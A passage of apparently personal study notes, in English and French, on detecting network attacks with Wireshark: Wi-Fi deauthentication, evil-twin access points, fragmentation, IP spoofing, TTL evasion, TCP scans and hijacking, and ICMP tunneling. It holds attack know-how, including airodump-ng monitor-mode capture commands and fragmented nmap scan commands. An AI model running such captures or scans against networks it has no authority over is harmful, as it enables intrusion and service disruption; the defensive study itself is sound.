     sudo ifconfig wlan0 down
     sudo iwconfig wlan0 mode monitor
     sudo ifconfig wlan0 up
     ```

3. **Verify Monitor Mode**:
   After enabling monitor mode, verify it with `iwconfig`:

   ```bash
   iwconfig
   ```

4. **Capture Traffic Using airodump-ng**:
   To capture Wi-Fi traffic, specify the APâ€™s channel and BSSID, and output the results to a file using `airodump-ng`:

   ```bash
   sudo airodump-ng -c 4 --bssid F8:14:FE:4D:E6:F1 wlan0 -w raw
   ```

---

### How Deauthentication Attacks Work

**Deauthentication and dissociation attacks** are common types of **link-layer attacks** that attackers use for a variety of purposes:

* **Capturing WPA handshakes**
* **Disrupting service**
* **Forcing clients to connect to rogue or malicious networks**

In these attacks, the attacker **spoofs** deauthentication frames from the legitimate **Access Point (AP)**, tricking connected clients into disconnecting. This forces the client to re-authenticate, allowing the attacker to intercept the WPA handshake.

**Tools commonly used for deauthentication attacks** include:

* **aireplay-ng**
* **mdk4**

Often, the **reason code 7** (from the 802.11 standard) is used for deauthentication in these attacks.

---

### Detecting Deauthentication Attacks

When monitoring traffic, you can look for **deauthentication frames** sent from the AP's BSSID. In Wireshark, use the following steps to detect deauthentication attacks:

1. **Filter for the APâ€™s BSSID**:
   This isolates the frames sent by the targeted AP.

   ```bash
   wlan.bssid == xx:xx:xx:xx:xx:xx
   ```

2. **Filter for Deauthentication Frames**:
   Deauthentication frames are identified by the frame type and subtype. The subtype value for deauthentication is **12**.

   ```bash
   (wlan.bssid == xx:xx:xx:xx:xx:xx) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12)
   ```

3. **Look for Reason Code 7**:
   Reason code 7 is commonly used for deauthentication attacks. If a large number of deauthentication frames are seen with this reason code, itâ€™s likely an attack.

   ```bash
   (wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 7)
   ```

#### Revolving Reason Codes:

Sophisticated attackers may rotate the reason codes to avoid detection. To detect this, you can create filters for different reason codes. For example:

* **Reason Code 1**:

  ```bash
  (wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 1)
  ```

* **Reason Code 2**:

  ```bash
  (wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 2)
  ```

This allows you to capture attacks that donâ€™t always use reason code 7.

---

### Compensating Measures

To prevent **deauthentication attacks** and other **link-layer attacks**, consider the following defensive strategies:

* **Enable IEEE 802.11w**: This standard provides **Management Frame Protection (MFP)**, which helps secure management frames like deauthentication and disassociation frames.
* **Use WPA3-SAE**: WPA3 offers better protection against offline dictionary attacks and improves security over WPA2.
* **Update WIDS/WIPS**: Wireless Intrusion Detection and Prevention Systems (WIDS/WIPS) can help detect and mitigate such attacks. Ensure your detection rules are up-to-date.

---

### Detecting Failed Authentication Attempts

**Excessive association requests** may indicate an attack, as attackers will often try to associate with the network to capture the WPA handshake. To capture these requests in Wireshark, filter for association-related frames:

```bash
(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 0) or (wlan.fc.type_subtype == 1) or (wlan.fc.type_subtype == 11)
```

This filter helps identify **failed authentication attempts** or repeated association requests, which can be signs of a dictionary or brute force attack.

---

### Conclusion

Monitoring **802.11 traffic** for signs of **deauthentication attacks**, **failed authentications**, and other suspicious activity is crucial in maintaining Wi-Fi security. By utilizing tools like Wireshark and airodump-ng, and applying the correct filters, you can detect these attacks early and take appropriate actions to protect the network. Additionally, enabling robust security protocols like **WPA3** and **802.11w** will significantly reduce the likelihood of such attacks succeeding.

```

## **Rogue Access Point & Evil-Twin Attacks**

```jsx
### Point d'AccÃ¨s Rogue (Rogue AP)

Un **point d'accÃ¨s rogue** est un appareil non autorisÃ© connectÃ© directement au rÃ©seau, ce qui permet de contourner les contrÃ´les pÃ©riphÃ©riques. Ces points d'accÃ¨s peuvent :

* Contourner la segmentation du rÃ©seau.
* Fournir un accÃ¨s non autorisÃ© Ã  des sections restreintes du rÃ©seau.
* Parfois infiltrer des rÃ©seaux isolÃ©s (air-gapped).

#### Evil-Twin

Un **point d'accÃ¨s Evil-Twin** est gÃ©nÃ©ralement un point d'accÃ¨s autonome, sÃ©parÃ© du rÃ©seau lÃ©gitime, utilisÃ© par les attaquants pour intercepter des donnÃ©es via des attaques de type **Man-in-the-Middle (MITM)**. Ces points d'accÃ¨s :

* Sont souvent configurÃ©s pour capturer des informations sensibles, telles que des identifiants sans fil.
* Peuvent hÃ©berger des portails malveillants pour inciter les utilisateurs Ã  divulguer leurs informations de connexion.

#### DÃ©tection avec Airodump-ng

Nous pouvons utiliser **airodump-ng** avec un filtre ESSID pour dÃ©tecter les points d'accÃ¨s Evil-Twin :

```bash
sudo airodump-ng -c 4 --essid HTB-Wireless wlan0 -w raw
```

Exemple de sortie :

```
CH  4 ][ Elapsed: 1 min ][ 2023-07-13 16:06    
BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
F8:14:FE:4D:E6:F2   -7 100      470      155    0   4   54   OPN              HTB-Wireless
F8:14:FE:4D:E6:F1   -5  96      682        0    0   4  324   WPA2 CCMP   PSK  HTB-Wireless 
```

Cet exemple montre un AP malveillant ouvert avec un ESSID identique Ã  notre AP lÃ©gitime, suggÃ©rant une attaque de type **hostile portal**.

#### Analyse des Beacons pour la DÃ©tection d'Evil-Twin

Pour confirmer des anomalies, examinez les trames de beacon avec ce filtre Wireshark :

```bash
(wlan.fc.type == 00) and (wlan.fc.type_subtype == 8)
```

##### Analyse des Beacons :

* **Information RSN** : L'AP lÃ©gitime peut contenir des informations RSN indiquant WPA2 avec AES/TKIP et PSK. En revanche, un AP malveillant pourrait ne pas avoir ces informations RSN.
* **Champs supplÃ©mentaires** : Pour des attaques sophistiquÃ©es, vÃ©rifiez les informations spÃ©cifiques au vendeur et d'autres identifiants uniques qui pourraient manquer dans l'AP de l'attaquant.

#### Identification des Utilisateurs Compromis

Dans le cas d'attaques Evil-Twin sur un rÃ©seau ouvert :

1. Utilisez le filtre Wireshark suivant pour isoler le trafic provenant de l'AP suspect :

```bash
(wlan.bssid == F8:14:FE:4D:E6:F2)
```

2. La dÃ©tection des requÃªtes **ARP** provenant d'un appareil client sur ce rÃ©seau pourrait indiquer un compromis potentiel. Notez :

* L'adresse MAC de l'appareil client.
* Le nom d'hÃ´te.

Prenez des mesures rÃ©actives comme des rÃ©initialisations de mots de passe pour attÃ©nuer le risque.

#### DÃ©tection des Points d'AccÃ¨s Rogue

La dÃ©tection des points d'accÃ¨s rogue passe souvent par la surveillance des dispositifs rÃ©seau. Il faut chercher :

* Des rÃ©seaux non reconnus avec des signaux forts, en particulier des rÃ©seaux ouverts.
* Des points d'accÃ¨s suspects Ã  proximitÃ© (par exemple, des **hotspots Windows**).

Les rÃ©seaux inconnus sans cryptage peuvent indiquer des points d'accÃ¨s rogue mis en place pour contourner la sÃ©curitÃ© du rÃ©seau.

```

## **Fragmentation Attacks**

```jsx
### L'Analyse des Trafic RÃ©seau au Niveau de la Couche IP et l'Abus de la Fragmentation

Lors de l'analyse du trafic rÃ©seau, la **couche IP** est cruciale pour comprendre le transfert de paquets entre hÃ´tes. Cependant, cette couche ne dispose pas de mÃ©canismes pour dÃ©tecter les paquets perdus ou altÃ©rÃ©s, ces problÃ¨mes Ã©tant gÃ©rÃ©s par les couches **transport** et **application**. Voici les champs clÃ©s de l'en-tÃªte IP :

* **Longueur** : La longueur de l'en-tÃªte IP.
* **Longueur Totale** : La longueur totale du paquet IP, y compris les donnÃ©es.
* **DÃ©calage de Fragmentation** : Ce champ est dÃ©fini lorsque les paquets sont fragmentÃ©s, il aide Ã  la rÃ©assemblÃ©e au niveau du destinataire.
* **Adresses IP Source et Destination** : Identifie les hÃ´tes d'origine et de destination.

### L'Abus des Champs de Fragmentation

Les attaquants peuvent manipuler ces champs pour contourner les contrÃ´les rÃ©seau. Comprendre l'abus de ces champs peut amÃ©liorer la dÃ©tection lors de l'analyse du trafic.

#### Techniques d'Abus de la Fragmentation

Les hÃ´tes lÃ©gitimes fragmentent les paquets pour transfÃ©rer de grands ensembles de donnÃ©es, suivant la norme **Maximum Transmission Unit (MTU)**. Les attaquants exploitent la fragmentation pour :

1. **Ã‰vasion des systÃ¨mes de dÃ©tection d'intrusion (IDS) / systÃ¨mes de prÃ©vention des intrusions (IPS)** : Si l'IDS ne rÃ©assemble pas les fragments, les attaquants peuvent utiliser des scans fragmentÃ©s (par exemple, avec `nmap`) pour contourner la dÃ©tection.
2. **Ã‰vasion des Pare-feux** : Les paquets fragmentÃ©s peuvent contourner les contrÃ´les du pare-feu s'ils ne sont pas rÃ©assemblÃ©s avant la livraison.
3. **Ã‰puisement des ressources des pare-feux/IPS/IDS** : Des tailles MTU petites (par exemple, 10, 15 octets) sollicitent les ressources et peuvent contourner la rÃ©assemblÃ©e en raison de limites de ressources.
4. **DÃ©ni de service (DoS)** : Des hÃ´tes anciens peuvent Ãªtre submergÃ©s par des paquets fragmentÃ©s volumineux, provoquant une attaque par dÃ©ni de service.

Un mÃ©canisme rÃ©seau correctement configurÃ© devrait utiliser **la rÃ©assemblÃ©e diffÃ©rÃ©e**, c'est-Ã -dire attendre tous les fragments avant d'effectuer l'inspection des paquets.

### DÃ©tection des Anomalies de DÃ©calage de Fragmentation

Pour inspecter les anomalies de fragmentation, ouvrez le fichier de capture dans Wireshark :

```bash
wireshark nmap_frag_fw_bypass.pcapng
```

#### Indicateurs de Scans FragmentÃ©s

* **RequÃªtes ICMP** : Les scans `nmap` ou similaires commencent souvent par des requÃªtes ICMP pour la dÃ©couverte d'hÃ´tes.

  ```bash
  nmap <adresse_ip_hÃ´te>
  ```

* **Paquets FragmentÃ©s avec MTU SpÃ©cifiÃ©** : Les attaquants dÃ©finissent un MTU spÃ©cifique pour fragmenter les paquets.

  ```bash
  nmap -f 10 <adresse_ip_hÃ´te>
  ```

  Les paquets avec une fragmentation rÃ©pÃ©tÃ©e d'un hÃ´te peuvent indiquer une attaque par fragmentation.

* **Un HÃ´te, Plusieurs Ports** : Les scans fragmentÃ©s gÃ©nÃ¨rent des rÃ©ponses avec des **flags RST** pour les ports fermÃ©s, ce qui indique des scans sur plusieurs ports.

#### Configuration de Wireshark pour la RÃ©assemblÃ©e

Si Wireshark ne rÃ©assemble pas les paquets automatiquement, vous devez ajuster les paramÃ¨tres sous **PrÃ©fÃ©rences** pour le protocole **IPv4** afin d'assurer la rÃ©assemblÃ©e des paquets, facilitant ainsi une inspection plus prÃ©cise.

---

### Conclusion

L'usage malveillant de la fragmentation, comme dans les attaques par **fragmentation de scans** ou **l'Ã©vasion des pare-feu**, peut Ãªtre dÃ©tectÃ© efficacement avec les bons outils et paramÃ¨tres. En ajustant correctement **Wireshark** pour rÃ©assembler les paquets, il devient possible de repÃ©rer les anomalies de fragmentation et de mieux protÃ©ger le rÃ©seau contre ces formes d'attaque.

```

## **IP Source & Destination Spoofing Attacks**

```jsx
### Manipulation des Champs IP dans le Trafic IPv4 et IPv6

Lors de l'analyse du trafic rÃ©seau, il est crucial d'examiner les champs **source IP** et **destination IP**, car leur manipulation peut Ãªtre un indicateur clÃ© d'attaques. Voici les Ã©lÃ©ments Ã  prendre en compte lors de lâ€™analyse du trafic rÃ©seau :

#### Source IP pour le Trafic Entrant

* La **source IP** du trafic entrant doit toujours appartenir Ã  notre sous-rÃ©seau. Une **IP externe** dans ce contexte pourrait indiquer une tentative de manipulation de paquets, comme le **spoofing**.

#### Source IP pour le Trafic Sortant

* La **source IP** du trafic sortant devrait aussi Ãªtre interne Ã  notre sous-rÃ©seau. Une plage d'IP inhabituelle peut suggÃ©rer du trafic malveillant provenant de l'intÃ©rieur du rÃ©seau, Ã©ventuellement d'un **hÃ´te compromis**.

### MÃ©thodes d'Attaque Impliquant le Spoofing IP

Les attaquants peuvent manipuler les champs IP source et destination pour diverses raisons :

#### 1. **Scanning avec AppÃ¢t**

* Les attaquants modifient l'adresse IP source pour se faire passer pour un hÃ´te du rÃ©seau cible afin d'Ã©viter les restrictions du pare-feu et contourner les contrÃ´les de sÃ©curitÃ©.

#### 2. **Attaque de Source AlÃ©atoire (DDoS)**

* Les attaquants envoient un grand volume de trafic depuis des **IP source alÃ©atoires** dans le but d'Ã©puiser les ressources du serveur cible (attaque par **dÃ©ni de service distribuÃ©**).

#### 3. **Attaque LAND**

* L'attaquant modifie l'IP source pour qu'elle corresponde Ã  l'IP de destination, provoquant l'Ã©puisement des ressources ou un **plantage** de l'hÃ´te cible.

#### 4. **Attaque SMURF**

* Envoie des paquets ICMP Ã  plusieurs hÃ´tes, avec l'IP de la victime comme adresse source, ce qui inonde la victime de rÃ©ponses.

#### 5. **GÃ©nÃ©ration de Vecteurs d'Initialisation**

* Dans les rÃ©seaux WEP plus anciens, des paquets avec des IP malveillantes peuvent Ãªtre injectÃ©s pour aider Ã  la construction de **tables de dÃ©cryptage** utilisÃ©es dans des attaques statistiques.

Ces attaques reposent principalement sur la manipulation des champs IP au niveau de la couche IP, plutÃ´t que sur l'empoisonnement ARP. Toutefois, ces deux mÃ©thodes peuvent Ãªtre combinÃ©es dans des attaques sophistiquÃ©es.

### DÃ©tection des Tentatives de Scan avec AppÃ¢t

Un attaquant peut modifier son IP source pour imiter un hÃ´te lÃ©gitime, avec pour objectif de contourner les contrÃ´les IDS/pare-feu. Les signes d'un **scan avec appÃ¢t** incluent :

* **Fragmentation initiale** en provenance d'une adresse spoofÃ©e.
* Trafic **TCP** provenant d'une adresse source lÃ©gitime, avec des **flags RST** pour les ports fermÃ©s.

#### Techniques de DÃ©tection :

1. **Reconstruction des Paquets** : Assurez-vous que les systÃ¨mes IDS/IPS/pare-feu peuvent reconstituer les paquets et analyser le comportement du trafic de la machine de destination.
2. **Consistance des Connexions** : Surveillez les connexions initiÃ©es par une machine et terminÃ©es par une autre, ce qui peut Ãªtre un indicateur de **cachage d'adresse**.

### DÃ©tection des Attaques de Source AlÃ©atoire

Les attaques de **source alÃ©atoire** sont souvent utilisÃ©es dans les attaques par dÃ©ni de service, oÃ¹ un grand nombre de **sources alÃ©atoires** sont utilisÃ©es pour cibler un service particulier. Les indicateurs incluent :

* Utilisation d'**un seul port** par plusieurs hÃ´tes alÃ©atoires.
* **Ports de base incrÃ©mentiels** : les ports de base sont constants avec peu de variation.
* **Longueur uniforme des paquets** : Contrairement au trafic lÃ©gitime des utilisateurs, les paquets crÃ©Ã©s peuvent avoir une longueur uniforme.

### DÃ©tection des Attaques SMURF

Les attaques **SMURF** exploitent les paquets ICMP en envoyant des demandes ICMP Ã  plusieurs hÃ´tes avec l'IP de la victime comme adresse source. Cela fait en sorte que chaque hÃ´te rÃ©ponde Ã  la victime, la noyant sous une masse de rÃ©ponses.

#### Ã‰tapes de l'Attaque SMURF :

1. Envoi de **requÃªtes ICMP** Ã  des hÃ´tes actifs avec l'IP de la victime comme source.
2. RÃ©ponses ICMP envoyÃ©es par les hÃ´tes vers la victime, la saturant de trafic.

#### DÃ©tection :

* **RÃ©ponses ICMP excessives** Ã  une seule cible.
* Des paquets ICMP fragmentÃ©s ou dotÃ©s de donnÃ©es supplÃ©mentaires peuvent Ãªtre utilisÃ©s pour **amplifier le volume de l'attaque**.

### DÃ©tection des Attaques LAND

Les attaques **LAND** consistent Ã  falsifier l'IP source pour qu'elle corresponde Ã  l'IP de destination. Cette attaque crÃ©e une surcharge en envoyant un trafic Ã©levÃ© Ã  un hÃ´te cible, ce qui empÃªche l'Ã©tablissement de connexions lÃ©gitimes.

#### Symptomatiques de l'Attaque LAND :

* Une **congestion du rÃ©seau** et des ressources sur l'hÃ´te cible Ã  cause de la tentative de connexions incessantes Ã  partir de la mÃªme adresse IP.

### Conclusion

Les attaques fondÃ©es sur la manipulation des champs IP, telles que le **spoofing** et les attaques DDoS utilisant des IP sources alÃ©atoires, reprÃ©sentent des risques considÃ©rables pour la sÃ©curitÃ© des rÃ©seaux. Une dÃ©tection efficace de ces attaques repose sur l'analyse minutieuse des modÃ¨les de trafic et la capacitÃ© Ã  reconstituer les paquets. La vigilance continue au niveau des systÃ¨mes IDS/IPS, des pare-feu et des mesures de sÃ©curitÃ© rÃ©seau est essentielle pour identifier ces menaces et les contrer de maniÃ¨re proactive.

```

## **IP Time-to-Live Attacks**

```jsx
### Manipulation du Time-to-Live (TTL) dans les Attaques

Les attaques utilisant la manipulation du **Time-to-Live** (TTL) sont une technique dâ€™Ã©vasion utilisÃ©e par les attaquants pour contourner les systÃ¨mes de dÃ©tection tels que les **pare-feu**, **IDS** et **IPS**. Voici le fonctionnement de la manipulation de TTL :

#### Manipulation du TTL

1. **CrÃ©ation de Paquets avec un TTL Bas** : L'attaquant configure le TTL Ã  une valeur basse (par exemple, 1, 2, 3).
2. **DÃ©crÃ©mentation du TTL** : Ã€ chaque **saut** (hop) sur le rÃ©seau, le TTL est rÃ©duit de 1.
3. **Rejet des Paquets** : Lorsque le TTL atteint zÃ©ro, le paquet est rejetÃ©, avant d'atteindre idÃ©alement un pare-feu ou un filtre.
4. **RÃ©ponse ICMP** : Les paquets expirÃ©s dÃ©clenchent des messages **ICMP Time Exceeded** envoyÃ©s par les routeurs sur le chemin vers l'origine du paquet.

#### DÃ©tection des Anomalies de TTL

Pour dÃ©tecter la manipulation du TTL, il est essentiel de capturer et dâ€™analyser le trafic Ã  lâ€™aide de **Wireshark**. Bien qu'une instance isolÃ©e soit difficile Ã  repÃ©rer, les attaquants utilisent souvent la manipulation du TTL lors de **scans de ports**, gÃ©nÃ©rant des motifs dÃ©tectables.

##### Indicateurs de Manipulation de TTL

* **SYN, ACK provenant de Ports de Service** : Une rÃ©ponse **SYN, ACK** lÃ©gitime provenant d'un port de service peut indiquer qu'un pare-feu a Ã©tÃ© contournÃ©.
* **Valeurs TTL Basses** : Lors de l'examen du champ **TTL** dans lâ€™onglet IPv4 de Wireshark, des valeurs de TTL **anormalement basses** peuvent indiquer des paquets manipulÃ©s.

#### StratÃ©gie de Mitigation

Une stratÃ©gie de mitigation consiste Ã  mettre en place un contrÃ´le qui filtre ou rejette les paquets ayant un TTL en dessous d'un certain seuil. Cela permet de prÃ©venir les attaques par manipulation du TTL qui exploitent les paquets **IP craftÃ©s** pour contourner les dÃ©fenses rÃ©seau.

```

## **TCP Handshake Abnormalities**

```jsx
### Probing TCP Services: Understanding Anomalous Behavior

When attackers probe TCP services, they often exploit various scanning techniques that deviate from standard traffic patterns. These behaviors can reveal malicious intent and indicate attempts to identify vulnerable services. To understand these anomalies, we first need to review how a standard **TCP 3-way handshake** works.

---

### TCP Handshake Overview

1. **SYN Request**: The client sends a SYN packet to initiate the connection to the target port.
2. **SYN-ACK Response**: If the target port is open, the server responds with a SYN-ACK, acknowledging the request and indicating that the port is open.
3. **ACK Completion**: The client responds with an ACK to complete the handshake and establish the connection.

### Common TCP Flags and Their Functions

* **URG (Urgent)**: Indicates that the data should be processed immediately.
* **ACK (Acknowledgment)**: Acknowledges that data has been received.
* **PSH (Push)**: Pushes data to the application layer immediately.
* **RST (Reset)**: Terminates the connection, often used in attack scenarios.
* **SYN (Synchronize)**: Initiates the connection during the handshake.
* **FIN (Finish)**: Ends the connection.
* **ECN (Explicit Congestion Notification)**: Notifies the sender of network congestion.

These flags are essential in tracking the state of TCP connections and can help identify unusual or malicious activity.

---

### Indicators of Abnormal TCP Handshake Patterns

When attackers probe services, certain abnormal behaviors can be observed during the TCP handshake or communication. These anomalies often serve as indicators of malicious activity:

* **Excessive Flags**: If multiple flags are used in one packet, or if the same flag appears repeatedly, this may indicate a scanning attempt.
* **Unusual Flag Combinations**: Combinations of flags that are not typically used together can suggest attempts to exploit vulnerabilities (e.g., RST flag usage in attempts to terminate or hijack connections).
* **Single Host Targeting Multiple Ports or Hosts**: Scans from a single host that target multiple ports or hosts are common in network reconnaissance. These could be decoy scans, or the attacker could be trying random source IPs to evade detection.

---

### Types of TCP Scans

#### 1. **SYN Scan (Half-Open Scan)**

* **Technique**: The attacker sends a SYN packet to a target port. If the port is open, the server responds with a SYN-ACK. The attacker then sends an RST to close the connection without completing the handshake.

* **Response**:

  * **Open Port**: SYN-ACK response from the server.
  * **Closed Port**: RST response from the server.

* **Detection**: This scan technique is stealthy because the attacker does not complete the handshake, leaving less trace in the target system's logs.

#### 2. **SYN Stealth Scan**

* **Technique**: Similar to SYN Scan, but the attacker only partially completes the handshake (e.g., only sends a SYN and never sends an ACK). This helps avoid detection by intrusion detection systems (IDS) and firewalls.

* **Response**:

  * **Open Port**: SYN-ACK response.
  * **Closed Port**: No response or an RST.

* **Detection**: This scan is particularly difficult to detect because it never fully establishes a connection.

#### 3. **NULL Scan**

* **Technique**: The attacker sends TCP packets with **no flags** set, which can confuse the target system.

* **Response**:

  * **Open Port**: No response from the system.
  * **Closed Port**: The system replies with an RST packet.

* **Detection**: NULL scans exploit the fact that some systems do not respond to packets with no flags set, while others will send an RST for closed ports.

#### 4. **ACK Scan**

* **Technique**: In an ACK scan, the attacker sends packets with the ACK flag set. This can be used to map out firewalls or filtering devices by determining whether the port is open or closed.

* **Response**:

  * **Open Port**: No response or an RST packet (depending on firewall configuration).
  * **Closed Port**: An RST packet response.

* **Detection**: The ACK scan can help the attacker determine which ports are filtered and which are open/closed, providing useful information for further attacks.

#### 5. **FIN Scan**

* **Technique**: All packets are sent with the **FIN flag** set. This is a highly unusual scan technique.

* **Response**:

  * **Open Port**: No response from the system.
  * **Closed Port**: The system replies with an RST packet.

* **Detection**: Like the NULL scan, the FIN scan relies on peculiar behavior from the target system, and is easily detectable if the attacker sends packets with the FIN flag in an unexpected context.

#### 6. **Xmas Tree Scan**

* **Technique**: The attacker sends packets with **all flags** set (SYN, FIN, URG, PSH, RST, and ACK). This scan is designed to confuse the target system or firewall.

* **Response**:

  * **Open Port**: No response or an RST packet (depending on firewall or system configuration).
  * **Closed Port**: An RST response.

* **Detection**: Xmas tree scans are easily identifiable because all the flags are set, which is highly unusual for normal network traffic.

---

### Summary of TCP Scan Responses

| **Scan Type**        | **Flags Used** | **Open Port Response** | **Closed Port Response** |
| -------------------- | -------------- | ---------------------- | ------------------------ |
| **SYN Scan**         | SYN            | SYN-ACK                | RST                      |
| **SYN Stealth Scan** | SYN            | SYN-ACK                | No Response / RST        |
| **NULL Scan**        | No Flags       | No Response            | RST                      |
| **ACK Scan**         | ACK            | No Response / RST      | RST                      |
| **FIN Scan**         | FIN            | No Response            | RST                      |
| **Xmas Tree Scan**   | All Flags      | No Response / RST      | RST                      |

---

### Conclusion

TCP scanning techniques, such as SYN, FIN, NULL, and Xmas Tree scans, all rely on manipulating specific flags to achieve reconnaissance while evading detection. By analyzing these abnormal TCP patternsâ€”whether excessive flag use, unusual flag combinations, or multiple host and port targetingâ€”security professionals can detect early signs of malicious scanning or probing. Identifying these patterns through tools like Wireshark is critical for preventing potential attacks that may follow.

```

## **TCP Connection Resets & Hijacking**

```jsx
### Attaques sur les Connexions TCP : Terminaison et DÃ©tournement de Connexion

Les connexions TCP, bien que robustes dans de nombreux contextes, prÃ©sentent des vulnÃ©rabilitÃ©s, notamment en ce qui concerne la protection contre l'interruption ou le dÃ©tournement des connexions. Ces failles peuvent se manifester par des attaques de terminaison de connexion via des paquets **RST** ou par des techniques plus avancÃ©es de dÃ©tournement de connexion.

#### Terminaison de Connexion TCP via Paquets RST

Une **attaque par injection de paquets RST** (ou terminaison de connexion TCP) vise Ã  perturber un service rÃ©seau. Cette attaque se dÃ©roule selon les Ã©tapes suivantes :

* **Usurpation de Source** : L'attaquant usurpe l'adresse source pour la faire correspondre Ã  celle de la machine cible.
* **Injection de Paquet RST** : L'attaquant crÃ©e un paquet TCP avec le drapeau RST pour forcer la terminaison de la connexion active.
* **Port de Destination CiblÃ©** : L'attaquant spÃ©cifie un port de destination actuellement utilisÃ© par la machine cible.

##### DÃ©tection des Attaques TCP RST

Pour dÃ©tecter une attaque par RST, vous pouvez chercher plusieurs indicateurs dans **Wireshark** ou d'autres outils de capture de paquets :

* **Volume Anormal de Paquets** : Une quantitÃ© anormale de paquets envoyÃ©s Ã  un port unique peut Ãªtre un signe d'attaque RST. Cela se manifeste gÃ©nÃ©ralement sous forme de paquets rÃ©pÃ©titifs avec le drapeau RST activÃ©.
* **DiscrÃ©pance des Adresses MAC** : Si des paquets avec une IP usurpÃ©e (par exemple, `192.168.10.4`) sont observÃ©s avec une adresse MAC inattendue, cela peut indiquer une activitÃ© malveillante. En effet, un paquet usurpÃ© doit correspondre Ã  l'adresse MAC de la machine cible, mais une incohÃ©rence suggÃ¨re un attaquant tentant de perturber la connexion.

Notez que **l'usurpation d'adresse MAC** est possible, mais elle peut entraÃ®ner des incohÃ©rences, notamment en cas d'empoisonnement ARP.

---

#### DÃ©tournement de Connexion TCP

Les attaques plus sophistiquÃ©es incluent le **dÃ©tournement de connexion TCP**, oÃ¹ l'attaquant prend le contrÃ´le d'une session TCP active. Cette attaque implique plusieurs techniques complexes :

* **PrÃ©diction des NumÃ©ros de SÃ©quence** : L'attaquant prÃ©dit les numÃ©ros de sÃ©quence pour injecter des paquets au bon endroit dans la connexion cible, imitant ainsi le flux lÃ©gitime de donnÃ©es.
* **Usurpation de Source** : Comme pour les attaques RST, l'attaquant usurpe l'adresse IP source pour imiter la machine cible.
* **Blocage des ACKs** : Pour maintenir la connexion dÃ©tournÃ©e, l'attaquant bloque ou retarde les paquets **ACK** (AccusÃ© de RÃ©ception) envoyÃ©s par la machine cible. Cela permet de maintenir un flux continu de donnÃ©es sans que la machine cible puisse rÃ©tablir le contrÃ´le.

##### Indicateurs de DÃ©tournement de Connexion TCP

Plusieurs anomalies peuvent indiquer une tentative de dÃ©tournement de connexion TCP :

* **Anomalies dans les NumÃ©ros de SÃ©quence** : Des numÃ©ros de sÃ©quence incohÃ©rents ou inhabituels peuvent suggÃ©rer des tentatives de prÃ©diction de sÃ©quence, ce qui est typique des attaques de dÃ©tournement de connexion.
* **ACKs BloquÃ©s ou RetardÃ©s** : Si les paquets ACK sont retardÃ©s ou absents, cela peut indiquer que l'attaquant tente de prendre le contrÃ´le de la session en bloquant la confirmation des paquets envoyÃ©s.

Le **dÃ©tournement de connexion TCP** est souvent couplÃ© avec des techniques comme **l'empoisonnement ARP**, qui permet Ã  l'attaquant de manipuler les adresses MAC dans le rÃ©seau, rendant le trafic plus difficile Ã  tracer.

---

### Conclusion

Les attaques sur les connexions TCP, telles que l'injection de paquets RST et le dÃ©tournement de connexions, exploitent des failles inhÃ©rentes au protocole TCP. La dÃ©tection de ces attaques repose sur l'observation des anomalies dans les numÃ©ros de sÃ©quence, des paquets RST rÃ©pÃ©titifs, ainsi que des incohÃ©rences dans les adresses MAC et les paquets ACK. Pour se dÃ©fendre contre ces attaques, il est essentiel de :

1. **Analyser attentivement les flux TCP** pour repÃ©rer les anomalies dans le trafic.
2. **VÃ©rifier la configuration des pare-feu et des rÃ©seaux** pour dÃ©tecter et bloquer les activitÃ©s suspectes.
3. **Utiliser des protocoles sÃ©curisÃ©s** comme **SSH** Ã  la place de Telnet pour limiter les risques d'interception de connexion.

En surveillant activement ces indicateurs et en mettant en Å“uvre des contrÃ´les de sÃ©curitÃ© appropriÃ©s, il est possible de dÃ©tecter et d'attÃ©nuer les attaques basÃ©es sur TCP avant qu'elles ne causent des dommages importants.

```

## **ICMP Tunneling**

```jsx

Le **tunneling** est une mÃ©thode utilisÃ©e par les attaquants pour exfiltrer des donnÃ©es d'un systÃ¨me vers un autre, souvent en exploitant des protocoles de confiance ou des proxies autorisÃ©s par les contrÃ´les rÃ©seau.

#### Les Bases du Tunneling

Lorsqu'un attaquant a besoin d'envoyer des donnÃ©es vers un hÃ´te externe, il peut utiliser le tunneling. Cela peut se faire en Ã©tablissant une commande et un contrÃ´le sur une machine compromise. Les attaquants utilisent divers protocoles pour le tunneling, notamment **SSH**, **HTTP**, **HTTPS**, **DNS** et **ICMP**, chacun permettant de contourner les mesures de sÃ©curitÃ© rÃ©seau.

### ICMP Tunneling

L'**ICMP tunneling** consiste Ã  insÃ©rer des donnÃ©es dans le champ de donnÃ©es des requÃªtes ICMP pour les dissimuler dans le trafic rÃ©seau normal. Comme ICMP est un protocole lÃ©gitime utilisÃ© pour la gestion des rÃ©seaux, il est souvent nÃ©gligÃ© par les mÃ©canismes de sÃ©curitÃ©, ce qui permet aux attaquants de contourner facilement les contrÃ´les rÃ©seau.

### DÃ©tection de l'ICMP Tunneling

Le tunneling ICMP implique l'insertion de donnÃ©es dans le champ de donnÃ©es des requÃªtes ICMP, ce qui peut Ãªtre dÃ©tectÃ© en examinant la taille des donnÃ©es dans les requÃªtes et rÃ©ponses ICMP. Voici quelques mÃ©thodes pour identifier ce type d'attaque :

#### 1. **Filtrage ICMP avec Wireshark**

Utilisez le filtre ICMP dans Wireshark pour visualiser le trafic spÃ©cifique ICMP :

```
icmp
```

#### 2. **DÃ©tection de Transferts de DonnÃ©es Importants**

Le trafic ICMP fragmentÃ© ou des champs de donnÃ©es exceptionnellement larges peuvent indiquer un tunneling. Les requÃªtes ICMP normales ont des champs de donnÃ©es relativement petits (environ 48 octets). Si la taille du champ de donnÃ©es dÃ©passe 48 octets, cela pourrait signaler un transfert de donnÃ©es, souvent liÃ© au tunneling. Les tailles de donnÃ©es peuvent parfois atteindre 38 000 octets dans des attaques avancÃ©es.

#### 3. **Inspection du Contenu des DonnÃ©es**

